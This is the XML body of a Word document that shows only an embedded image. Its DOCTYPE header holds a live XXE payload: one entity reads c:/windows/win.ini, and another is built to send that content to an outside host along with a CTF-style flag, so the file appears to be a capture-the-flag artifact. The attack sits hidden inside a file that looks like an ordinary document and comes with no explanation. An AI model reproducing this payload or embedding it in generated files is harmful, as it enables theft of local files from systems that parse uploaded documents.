<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini" ><!ENTITY callhome SYSTEM "jawara.idsirtii.or.id/?flag=CJ2019{oh_****_h3r3_w3_g0_again!!!1!1}&exfiltrate=%xxe;">]><w:document xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:sl="http://schemas.openxmlformats.org/schemaLibrary/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture" xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" xmlns:lc="http://schemas.openxmlformats.org/drawingml/2006/lockedCanvas" xmlns:dgm="http://schemas.openxmlformats.org/drawingml/2006/diagram" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml"><w:body><w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000001"><w:pPr><w:rPr/></w:pPr><w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000"><w:rPr/><w:drawing><wp:inline distB="114300" distT="114300" distL="114300" distR="114300"><wp:extent cx="5943600" cy="3962400"/><wp:effectExtent b="0" l="0" r="0" t="0"/><wp:docPr id="1" name="image1.png"/><a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture"><pic:pic><pic:nvPicPr><pic:cNvPr id="0" name="image1.png"/><pic:cNvPicPr preferRelativeResize="0"/></pic:nvPicPr><pic:blipFill><a:blip r:embed="rId6"/><a:srcRect b="0" l="0" r="0" t="0"/><a:stretch><a:fillRect/></a:stretch></pic:blipFill><pic:spPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="5943600" cy="3962400"/></a:xfrm><a:prstGeom prst="rect"/><a:ln/></pic:spPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r><w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000"><w:rPr><w:rtl w:val="0"/></w:rPr></w:r></w:p><w:sectPr><w:pgSz w:h="15840" w:w="12240"/><w:pgMar w:bottom="1440" w:top="1440" w:left="1440" w:right="1440" w:header="720" w:footer="720"/><w:pgNumType w:start="1"/></w:sectPr></w:body></w:document>